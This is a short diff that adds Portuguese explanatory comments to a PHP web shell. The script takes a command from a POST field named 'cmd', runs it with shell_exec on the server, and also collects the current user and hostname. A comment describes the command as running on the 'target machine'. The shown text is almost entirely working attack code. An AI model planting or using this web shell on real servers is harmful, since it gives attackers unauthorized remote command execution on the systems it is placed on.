@@ -1,13 +1,23 @@
 <?php
 
+// Pega o diretório atual
 $currentDir = getcwd();
+
+// Executa o comando para ver qual é o usuario atual
 $user = trim(shell_exec('whoami'));
+
+// Pega o host
 $host = gethostname();
 
+// Guarda o comando enviado através do formulário
 $cmd = $_POST['cmd'] ?? null;
+
+// Guarda a saída gerada pelo comando
 $output = '';
 
+// Verifica se existe comando vindo via post
 if ($cmd) {
+    // Se sim, vai guardar o comando executado, e usar o shell_exec para executar o comando na marquina alvo.
     $output = shell_exec($cmd . " 2>&1");
 }
 
